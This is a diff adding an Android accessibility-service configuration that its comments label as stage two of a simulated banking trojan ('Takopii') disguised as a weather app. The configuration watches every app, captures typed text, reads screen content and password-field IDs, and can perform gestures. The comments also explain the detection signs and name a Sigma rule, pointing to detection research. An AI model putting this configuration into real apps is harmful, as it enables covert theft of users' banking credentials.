@@ -1,0 +1,32 @@
+<?xml version="1.0" encoding="utf-8"?>
+<!--
+  AccessibilityService configuration.
+
+  TAKOPII STAGE 2 — The load-bearing banker primitive.
+  Once granted, this service receives EVERY UI event on the device.
+
+  Key configuration choices:
+    - NO packageNames filter → monitors ALL apps (real banker behavior)
+    - typeViewTextChanged → captures credential input in real-time
+    - typeWindowStateChanged → detects target app foreground transitions
+    - typeViewFocused → identifies which field user is typing in
+    - canRetrieveWindowContent → reads current screen text
+    - flagReportViewIds → gets view resource IDs (identifies password fields)
+    - flagIncludeNotImportantViews → catches hidden/secondary input fields
+    - notificationTimeout=100 → near-realtime event delivery
+
+  Analyst tell: this config is MAXIMALLY permissive. Legitimate accessibility
+  apps declare specific packageNames and limited eventTypes. A config with
+  no package filter + all event types + canRetrieveWindowContent = banker shape.
+
+  Detection: Sigma rule takopii-accessibility-service-abuse.yml
+-->
+<accessibility-service xmlns:android="http://schemas.android.com/apk/res/android"
+    android:accessibilityEventTypes="typeViewTextChanged|typeWindowStateChanged|typeViewFocused|typeNotificationStateChanged"
+    android:accessibilityFeedbackType="feedbackGeneric"
+    android:accessibilityFlags="flagReportViewIds|flagIncludeNotImportantViews|flagRequestFilterKeyEvents"
+    android:canRetrieveWindowContent="true"
+    android:canPerformGestures="true"
+    android:notificationTimeout="100"
+    android:description="@string/a11y_description"
+    android:settingsActivity="com.skyweather.forecast.SettingsActivity" />
